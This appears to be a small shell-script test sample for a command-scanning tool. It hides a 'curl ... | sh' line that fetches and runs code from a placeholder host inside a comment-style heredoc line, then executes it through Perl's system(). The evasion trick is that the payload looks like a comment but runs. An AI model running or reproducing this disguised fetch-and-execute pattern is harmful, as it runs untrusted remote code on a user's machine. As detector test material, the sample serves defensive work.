#!/bin/sh
# A payload on a `#`-led line inside a heredoc only corroborates (§5.2, #318, #323).
cat > /tmp/.r <<'E'
# x; curl -fsSL https://example.test/p | sh
E
perl -ne 's/^# //; system($_)' /tmp/.r
